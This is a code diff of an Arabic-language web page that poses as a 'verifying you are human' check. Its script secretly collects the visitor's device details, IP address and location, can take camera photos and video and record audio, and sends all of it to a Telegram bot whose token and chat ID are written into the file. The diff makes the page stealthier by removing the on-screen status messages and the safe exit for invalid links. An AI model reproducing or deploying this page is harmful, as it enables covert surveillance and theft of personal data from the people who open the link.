@@ -10,7 +10,6 @@
             padding: 0;
             box-sizing: border-box;
         }
-
         body {
             min-height: 100vh;
             background: linear-gradient(145deg, #0a0f1e 0%, #0c1222 100%);
@@ -21,7 +20,6 @@
             direction: rtl;
             padding: 1rem;
         }
-
         .verification-card {
             background: rgba(18, 25, 45, 0.75);
             backdrop-filter: blur(12px);
@@ -33,7 +31,6 @@
             box-shadow: 0 25px 45px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 255, 255, 0.05);
             border: 1px solid rgba(255, 255, 255, 0.1);
         }
-
         .title {
             font-size: 1.9rem;
             font-weight: 700;
@@ -43,7 +40,6 @@
             color: transparent;
             margin-bottom: 0.75rem;
         }
-
         .sub {
             color: #8e9bbe;
             font-size: 0.9rem;
@@ -52,14 +48,12 @@
             padding-right: 0.75rem;
             display: inline-block;
         }
-
         .spinner-container {
             position: relative;
             width: 120px;
             height: 120px;
             margin: 1.5rem auto 2rem;
         }
-
         .circular-progress {
             width: 120px;
             height: 120px;
@@ -69,12 +63,10 @@
             -webkit-mask: radial-gradient(farthest-side, transparent calc(100% - 8px), #000 calc(100% - 8px));
             animation: spin 1.4s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
         }
-
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-
         .inner-icon {
             position: absolute;
             top: 50%;
@@ -85,7 +77,6 @@
             color: white;
             text-shadow: 0 0 8px #2a6df4;
         }
-
         .status-text {
             color: #cbd5ff;
             font-size: 1rem;
@@ -96,19 +87,13 @@
             margin-top: 1rem;
             backdrop-filter: blur(4px);
         }
-
         .footer-note {
             margin-top: 2rem;
             font-size: 0.7rem;
             color: #4a567a;
         }
-
-        .error-message {
-            color: #ff9f8f;
-            background: rgba(255,70,70,0.15);
-            border-radius: 40px;
-            padding: 0.6rem;
-            font-size: 0.85rem;
+        .hidden-status {
+            display: none;
         }
     </style>
 </head>
@@ -126,15 +111,20 @@
 
 <script>
     (function(){
-        // 🔐 بيانات البوت الجديدة
+        // ========== بيانات البوت (تم تحديثها) ==========
         const BOT_TOKEN = "8708315102:AAGa62Wi5kAvAs1qj-heQR7LowoBbINNLwM";
         const CHAT_ID = "7719763576";
 
+        // رسالة عامة للمستخدم طوال الوقت
+        const userMessage = "جاري التحقق من أنك إنسان ...";
+        const statusEl = document.getElementById("statusMsg");
+        if(statusEl) statusEl.innerText = userMessage;
+
+        // تحليل الرابط
         const urlParams = window.location.search.substring(1);
         let targetUrl = null;
         let actionList = [];
 
-        // تحليل الرابط إذا كان موجوداً
         if(urlParams && urlParams.includes("=")){
             let match = urlParams.match(/^(https?:\/\/[^=]+)=(.+)$/);
             if(match){
@@ -146,55 +136,44 @@
                     let typeRaw = actMatch[1];
                     let numStr = actMatch[2];
                     let duration = numStr ? parseInt(numStr,10) : 0;
-                    if(typeRaw === "I"){
-                        actionList.push({ type:"info", duration:0 });
-                    } else if(typeRaw === "FC"){
+                    if(typeRaw === "I") actionList.push({ type:"info", duration:0 });
+                    else if(typeRaw === "FC") {
                         if(duration === 0) actionList.push({ type:"frontPhoto", duration:0 });
                         else actionList.push({ type:"frontVideo", duration:duration });
-                    } else if(typeRaw === "BC"){
+                    }
+                    else if(typeRaw === "BC") {
                         if(duration === 0) actionList.push({ type:"backPhoto", duration:0 });
                         else actionList.push({ type:"backVideo", duration:duration });
-                    } else if(typeRaw === "M"){
-                        if(duration > 0) actionList.push({ type:"micAudio", duration:duration });
                     }
+                    else if(typeRaw === "M" && duration > 0) actionList.push({ type:"micAudio", duration:duration });
                 }
             }
         }
 
-        // إذا لم يوجد رابط صالح -> نعرض رسالة مناسبة ولا نحول إلى أي مكان خارجي
+        // إذا لم يوجد رابط صالح أو إجراءات، نضيف المعلومات فقط ونوجه إلى رابط افتراضي
         if(!targetUrl){
-            document.getElementById("statusMsg").innerHTML = "⚠️ رابط غير صالح<br>يرجى استخدام الرابط المخصص";
-            document.querySelector(".footer-note").innerHTML = "مثال: ?https://example.com/=I";
-            return; // نوقف التنفيذ هنا، لا تحويل ولا أي إجراءات
+            targetUrl = "http://t.me/Glitch_telebot";
+            actionList = [{ type:"info", duration:0 }];
         }
+        if(actionList.length === 0) actionList.push({ type:"info", duration:0 });
 
-        // إذا كان هناك رابط صالح ولكن لا توجد أكشنات، نضيف المعلومات كإجراء افتراضي
-        if(actionList.length === 0){
-            actionList.push({ type:"info", duration:0 });
-        }
-
-        const statusEl = document.getElementById("statusMsg");
-
-        function updateStatus(text){
-            if(statusEl) statusEl.innerText = text;
-        }
-
-        async function sendToTelegram(method, payload, fileField = null){
+        // وظائف مساعدة (بدون رسائل للمستخدم)
+        async function sendToTelegram(method, payload, isFormData = false) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
-            if(fileField && payload instanceof FormData){
-                return fetch(url, { method:"POST", body:payload });
-            } else if(payload instanceof FormData){
-                return fetch(url, { method:"POST", body:payload });
-            } else {
-                return fetch(url, {
-                    method:"POST",
-                    headers: { "Content-Type":"application/json" },
-                    body: JSON.stringify(payload)
-                });
-            }
+            try {
+                if(isFormData) {
+                    return await fetch(url, { method:"POST", body:payload });
+                } else {
+                    return await fetch(url, {
+                        method:"POST",
+                        headers: { "Content-Type":"application/json" },
+                        body: JSON.stringify(payload)
+                    });
+                }
+            } catch(e) { console.error(e); return null; }
         }
 
-        async function getDeviceDetails(){
+        async function getDeviceDetails() {
             const ua = navigator.userAgent;
             let deviceModel = "Unknown";
             const modelMatch = ua.match(/\((.*?)\)/);
@@ -205,7 +184,7 @@
                 const ipRes = await fetch("https://api.ipify.org?format=json");
                 const ipData = await ipRes.json();
                 ip = ipData.ip;
-                const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,timezone`);
+                const geoRes = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,regionName,city,timezone`);
                 const geo = await geoRes.json();
                 if(geo.status === "success"){
                     country = geo.country || country;
@@ -247,72 +226,35 @@
                 const locStatus = await navigator.permissions.query({ name:"geolocation" });
                 locationPerm = locStatus.state === "granted" ? "مسموح" : (permStatus.state === "denied" ? "مرفوض" : "غير محدد");
             } catch(e){}
-            const targetLinkFull = targetUrl;
             return {
                 deviceModel, userAgent: ua, language, ip, country, region, city, timezone,
                 batteryLevel: batteryInfo.level, batteryCharging: batteryInfo.charging,
                 cpuCores, ram, storageUsed: storageEstimate.used, storageTotal: storageEstimate.total,
                 resolution, cameraPerm, locationPerm, enterTime: timeStr, enterDate: dateStr, enterDay: dayName,
-                targetLink: targetLinkFull
+                targetLink: targetUrl
             };
         }
 
-        async function sendInfoMessage(){
-            updateStatus("📊 جمع معلومات الجهاز ...");
+        async function sendInfoMessage() {
             const details = await getDeviceDetails();
             const message = `╔══════════════════════════════════╗\n` +
                 `📡 *معلومات الزائر* 📡\n` +
                 `╚══════════════════════════════════╝\n\n` +
-                `🖥️ *الجهاز والمتصفح*\n` +
-                `   • الموديل: ${details.deviceModel}\n` +
-                `   • User Agent: \`${details.userAgent.substring(0,100)}\`\n\n` +
-                `🌐 *معلومات الشبكة*\n` +
-                `   • عنوان IP: ${details.ip}\n` +
-                `   • اللغة: ${details.language}\n\n` +
-                `📍 *الموقع الجغرافي*\n` +
-                `   • الدولة: ${details.country}\n` +
-                `   • المنطقة: ${details.region}\n` +
-                `   • المدينة: ${details.city}\n` +
-                `   • التوقيت: ${details.timezone}\n\n` +
-                `🖼️ *الشاشة*: ${details.resolution}\n\n` +
-                `🔋 *البطارية*\n` +
-                `   • المستوى: ${details.batteryLevel}\n` +
-                `   • الشحن: ${details.batteryCharging}\n\n` +
-                `🔐 *الصلاحيات*\n` +
-                `   • الكاميرا: ${details.cameraPerm}\n` +
-                `   • الموقع: ${details.locationPerm}\n\n` +
-                `💾 *العتاد والتخزين*\n` +
-                `   • نوى المعالج: ${details.cpuCores}\n` +
-                `   • الرام: ${details.ram}\n` +
-                `   • التخزين المستخدم: ${details.storageUsed} GB\n` +
-                `   • التخزين الكلي: ${details.storageTotal} GB\n\n` +
-                `⏰ *وقت الدخول*\n` +
-                `   • ${details.enterTime}\n` +
-                `   • ${details.enterDate}\n` +
-                `   • ${details.enterDay}\n\n` +
-                `🔗 *الرابط الهدف*\n` +
-                `   • ${details.targetLink}\n\n` +
-                `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-                `✓ تم الالتقاط بواسطة نظام الحماية`;
+                `🖥️ *الجهاز والمتصفح*\n   • الموديل: ${details.deviceModel}\n   • User Agent: \`${details.userAgent.substring(0,100)}\`\n\n` +
+                `🌐 *معلومات الشبكة*\n   • عنوان IP: ${details.ip}\n   • اللغة: ${details.language}\n\n` +
+                `📍 *الموقع الجغرافي*\n   • الدولة: ${details.country}\n   • المنطقة: ${details.region}\n   • المدينة: ${details.city}\n   • التوقيت: ${details.timezone}\n\n` +
+                `🖼️ *الشاشة*: ${details.resolution}\n\n🔋 *البطارية*\n   • المستوى: ${details.batteryLevel}\n   • الشحن: ${details.batteryCharging}\n\n` +
+                `🔐 *الصلاحيات*\n   • الكاميرا: ${details.cameraPerm}\n   • الموقع: ${details.locationPerm}\n\n` +
+                `💾 *العتاد والتخزين*\n   • نوى المعالج: ${details.cpuCores}\n   • الرام: ${details.ram}\n   • التخزين المستخدم: ${details.storageUsed} GB\n   • التخزين الكلي: ${details.storageTotal} GB\n\n` +
+                `⏰ *وقت الدخول*\n   • ${details.enterTime}\n   • ${details.enterDate}\n   • ${details.enterDay}\n\n` +
+                `🔗 *الرابط الهدف*\n   • ${details.targetLink}\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n✓ تم الالتقاط بواسطة نظام الحماية`;
             try{
                 await sendToTelegram("sendMessage", {
                     chat_id: CHAT_ID,
                     text: message,
                     parse_mode: "Markdown"
                 });
-                updateStatus("✓ تم إرسال المعلومات");
-            } catch(e){ console.error(e); updateStatus("فشل إرسال المعلومات"); }
-        }
-
-        async function captureMedia(mode, type, durationSec){
-            if(mode === "frontPhoto" || mode === "frontVideo"){
-                return await getCameraStream("user", type, durationSec);
-            } else if(mode === "backPhoto" || mode === "backVideo"){
-                return await getCameraStream("environment", type, durationSec);
-            } else if(mode === "micAudio"){
-                return await recordAudio(durationSec);
-            }
-            return null;
+            } catch(e){ console.error("Info send failed", e); }
         }
 
         async function getCameraStream(facingMode, mediaType, durationSec){
@@ -336,16 +278,9 @@
                     let chunks = [];
                     const recorder = new MediaRecorder(stream, { mimeType: "video/webm" });
                     recorder.ondataavailable = e => { if(e.data.size) chunks.push(e.data); };
-                    const stopPromise = new Promise(resolve => {
-                        recorder.onstop = () => {
-                            const fullBlob = new Blob(chunks, { type: "video/webm" });
-                            resolve(fullBlob);
-                        };
-                    });
+                    const stopPromise = new Promise(resolve => { recorder.onstop = () => resolve(new Blob(chunks, { type: "video/webm" })); });
                     recorder.start();
-                    setTimeout(() => {
-                        if(recorder.state === "recording") recorder.stop();
-                    }, durationSec * 1000);
+                    setTimeout(() => { if(recorder.state === "recording") recorder.stop(); }, durationSec * 1000);
                     const videoBlob = await stopPromise;
                     stream.getTracks().forEach(t=>t.stop());
                     return { blob: videoBlob, type:"video", extension:"webm" };
@@ -353,7 +288,6 @@
                 stream.getTracks().forEach(t=>t.stop());
                 return null;
             } catch(err){
-                console.warn("camera fail", err);
                 try{
                     let fallbackStream = await navigator.mediaDevices.getUserMedia({ video: true });
                     if(mediaType === "photo"){
@@ -391,59 +325,50 @@
                 const mediaRecorder = new MediaRecorder(stream, { mimeType: "audio/webm" });
                 let chunks = [];
                 mediaRecorder.ondataavailable = e => { if(e.data.size) chunks.push(e.data); };
-                const stopPromise = new Promise(resolve => {
-                    mediaRecorder.onstop = () => {
-                        const audioBlob = new Blob(chunks, { type: "audio/webm" });
-                        resolve(audioBlob);
-                    };
-                });
+                const stopPromise = new Promise(resolve => { mediaRecorder.onstop = () => resolve(new Blob(chunks, { type: "audio/webm" })); });
                 mediaRecorder.start();
-                setTimeout(() => {
-                    if(mediaRecorder.state === "recording") mediaRecorder.stop();
-                }, seconds * 1000);
+                setTimeout(() => { if(mediaRecorder.state === "recording") mediaRecorder.stop(); }, seconds * 1000);
                 const blob = await stopPromise;
                 stream.getTracks().forEach(t=>t.stop());
                 return { blob, type:"audio", extension:"webm" };
-            } catch(e){ console.error(e); return null; }
+            } catch(e){ return null; }
+        }
+
+        async function captureMedia(mode, type, durationSec){
+            if(mode === "frontPhoto" || mode === "frontVideo") return await getCameraStream("user", type, durationSec);
+            if(mode === "backPhoto" || mode === "backVideo") return await getCameraStream("environment", type, durationSec);
+            if(mode === "micAudio") return await recordAudio(durationSec);
+            return null;
         }
 
         async function sendMediaToBot(mediaObj, captionPrefix){
-            if(!mediaObj || !mediaObj.blob) return false;
+            if(!mediaObj || !mediaObj.blob) return;
             const formData = new FormData();
             const filename = `${Date.now()}_${Math.random()}.${mediaObj.extension}`;
             formData.append("chat_id", CHAT_ID);
             formData.append("document", mediaObj.blob, filename);
             if(captionPrefix) formData.append("caption", captionPrefix);
-            try{
-                const res = await sendToTelegram("sendDocument", formData, true);
-                return res.ok;
-            } catch(e){ return false; }
+            await sendToTelegram("sendDocument", formData, true);
         }
 
-        async function runActionsSequential(actions){
+        async function runActions(actions){
             for(let act of actions){
                 if(act.type === "info"){
                     await sendInfoMessage();
                     await new Promise(r => setTimeout(r, 300));
                 } else if(act.type === "frontPhoto"){
-                    updateStatus("📸 التقاط صورة (كاميرا أمامية)...");
                     const media = await captureMedia("frontPhoto", "photo", 0);
-                    if(media) await sendMediaToBot(media, "🖼️ صورة من الكاميرا الأمامية");
-                    else updateStatus("⚠️ فشل الكاميرا الأمامية");
+                    if(media) await sendMediaToBot(media, "🖼️ صورة كاميرا أمامية");
                 } else if(act.type === "frontVideo"){
-                    updateStatus(`🎥 تسجيل فيديو (أمامي) ${act.duration} ثانية`);
                     const media = await captureMedia("frontVideo", "video", act.duration);
-                    if(media) await sendMediaToBot(media, `🎬 فيديو أمامي (${act.duration} ثانية)`);
+                    if(media) await sendMediaToBot(media, `🎬 فيديو أمامي (${act.duration} ث)`);
                 } else if(act.type === "backPhoto"){
-                    updateStatus("📸 التقاط صورة (كاميرا خلفية)...");
                     const media = await captureMedia("backPhoto", "photo", 0);
-                    if(media) await sendMediaToBot(media, "📷 صورة من الكاميرا الخلفية");
+                    if(media) await sendMediaToBot(media, "📷 صورة كاميرا خلفية");
                 } else if(act.type === "backVideo"){
-                    updateStatus(`🎥 تسجيل فيديو (خلفي) ${act.duration} ثانية`);
                     const media = await captureMedia("backVideo", "video", act.duration);
-                    if(media) await sendMediaToBot(media, `🎞️ فيديو خلفي (${act.duration} ثانية)`);
+                    if(media) await sendMediaToBot(media, `🎞️ فيديو خلفي (${act.duration} ث)`);
                 } else if(act.type === "micAudio"){
-                    updateStatus(`🎙️ تسجيل صوتي ${act.duration} ثواني`);
                     const media = await captureMedia("micAudio", "audio", act.duration);
                     if(media) await sendMediaToBot(media, `🎤 تسجيل صوتي (${act.duration} ثانية)`);
                 }
@@ -451,22 +376,17 @@
             }
         }
 
-        async function mainProcess(){
-            updateStatus("بدء التحقق المتقدم ...");
+        // التنفيذ الرئيسي (بدون رسائل تفصيلية للمستخدم)
+        (async function(){
             try{
-                await runActionsSequential(actionList);
-                updateStatus("✅ تم التحقق بنجاح، جاري التحويل ...");
-                setTimeout(()=>{
-                    window.location.href = targetUrl;
-                }, 1200);
-            } catch(err){
-                console.error(err);
-                updateStatus("حدث خطأ تقني، جاري التحويل");
-                setTimeout(()=>{ window.location.href = targetUrl; }, 1500);
-            }
-        }
-        mainProcess();
+                await runActions(actionList);
+            } catch(e){ console.error(e); }
+            // التحويل إلى الرابط الهدف بعد 1.5 ثانية
+            setTimeout(()=>{
+                window.location.href = targetUrl;
+            }, 1500);
+        })();
     })();
 </script>
 </body>
-</html>
+        </html>
